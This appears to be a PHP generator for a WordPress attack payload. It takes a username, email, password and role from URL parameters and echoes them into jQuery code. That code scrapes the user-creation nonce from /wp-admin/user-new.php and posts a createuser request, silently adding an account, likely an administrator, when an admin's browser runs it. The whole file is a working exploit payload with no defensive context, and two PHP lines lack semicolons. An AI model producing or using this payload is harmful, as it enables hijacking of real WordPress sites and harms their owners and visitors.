<?php
$usuario = $_GET['usuario'];
$mail = $_GET['mail'];
$pass = $_GET['password']
$rol = $_GET['rol']

?>

u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user\"\svalue=\"(.+?)\"/)[1],user_login:"<?php echo $usuario; ?>",email:"<?php echo $mail; ?>",pass1:"<?php echo $pass; ?>",pass2:"<?php echo $pass; ?>",role:"<?php echo $rol; ?>"})});
